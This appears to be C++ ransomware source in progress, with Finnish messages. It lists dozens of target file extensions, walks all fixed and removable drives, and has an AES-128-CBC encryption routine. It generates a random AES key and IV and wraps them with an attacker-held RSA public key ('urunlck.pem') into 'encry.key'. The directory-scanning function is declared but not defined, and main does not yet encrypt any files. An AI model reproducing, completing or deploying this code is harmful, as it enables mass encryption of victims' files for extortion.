#include <windows.h>
#include <iostream>
#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sstream>
#include <fstream>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/engine.h>

std::vector<std::string> targetExtensions = {
    ".txt", ".vsxproj", ".vsxproj.user", ".vsxproj.filters", ".blend", ".tar", ".pro", ".ui", ".pfx",
    ".asp", ".inf", ".iso", ".h", ".url", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".jpg", ".png", ".bmp", ".gif", ".avi", ".mp4", ".mov", ".mp3", ".zip", ".rar",
    ".7z", ".cpp", ".c", ".py", ".java", ".sql", ".mdb", ".cs", ".html", ".csv",
    ".json", ".xml", ".xaml", ".css", ".js", ".pyw", ".bat", ".dll", ".sdb", ".xsd"
};

bool TGTEx(const std::string& filename) {
    for (const auto& ext : targetExtensions) {
        if (filename.length() >= ext.length() &&
            filename.compare(filename.length() - ext.length(), ext.length(), ext) == 0) {
            return true;
        }
    }
    return false;
}

void scanDirectory(const std::string& folderPath, int& fileCount);

void FiDirScn(int& driveCount, int& totalFileCount) {
    DWORD drives = GetLogicalDrives();
    for (char letter = 'A'; letter <= 'Z'; ++letter) {
        if (drives & (1 << (letter - 'A'))) {
            std::string drive = std::string(1, letter) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                driveCount++;
                int fileCount = 0;
                scanDirectory(drive, fileCount);
                totalFileCount += fileCount;
            }
        }
    }
}

int EncAEScbc(const unsigned char *plaintext, int plaintext_len,
              const unsigned char *key, const unsigned char *iv,
              unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len, ciphertext_len;

    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

std::vector<unsigned char> RsaEncryptKey(const unsigned char *data, size_t data_len, const char *urunlckPath) {
    FILE *key_file = fopen(urunlckPath, "rt");
    if (!key_file) throw std::runtime_error("Ei löydy urunlck.pem");

    EVP_PKEY *key = PEM_read_PUBKEY(key_file, NULL, NULL, NULL);
    fclose(key_file);
    if (!key) throw std::runtime_error("Virhe julkisen avaimen lukemisessa");

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(key, NULL);
    if (!ctx) throw std::runtime_error("Context luontivirhe");

    if (EVP_PKEY_encrypt_init(ctx) <= 0) throw std::runtime_error("Encrypt init fail");
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0)
        throw std::runtime_error("Padding fail");

    size_t out_len;
    EVP_PKEY_encrypt(ctx, NULL, &out_len, data, data_len);
    std::vector<unsigned char> out(out_len);
    if (EVP_PKEY_encrypt(ctx, out.data(), &out_len, data, data_len) <= 0)
        throw std::runtime_error("Encrypt fail");

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(key);

    out.resize(out_len);
    return out;
}

int main() {
    try {
        unsigned char aesKey[16], iv[16];
        RAND_bytes(aesKey, sizeof(aesKey));
        RAND_bytes(iv, sizeof(iv));

        unsigned char key_iv[32];
        memcpy(key_iv, aesKey, 16);
        memcpy(key_iv + 16, iv, 16);

        std::vector<unsigned char> rsaEnc = RsaEncryptKey(key_iv, sizeof(key_iv), "urunlck.pem");

        std::ofstream("encry.key", std::ios::binary).write((char*)rsaEnc.data(), rsaEnc.size());

        auto printBase64 = [](const unsigned char *data, size_t len) {
            static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string out;
            int val = 0, valb = -6;
            for (size_t i = 0; i < len; ++i) {
                val = (val << 8) + data[i];
                valb += 8;
                while (valb >= 0) {
                    out.push_back(b64_table[(val >> valb) & 0x3F]);
                    valb -= 6;
                }
            }
            if (valb > -6) out.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
            while (out.size() % 4) out.push_back('=');
            return out;
        };

        std::cout << "AES Key (Base64): " << printBase64(aesKey, 16) << "\n";
        std::cout << "IV (Base64): " << printBase64(iv, 16) << "\n";
        std::cout << "RSA-salattu avain tallennettu tiedostoon encry.key\n";

    } catch (const std::exception &e) {
        std::cerr << "Virhe: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}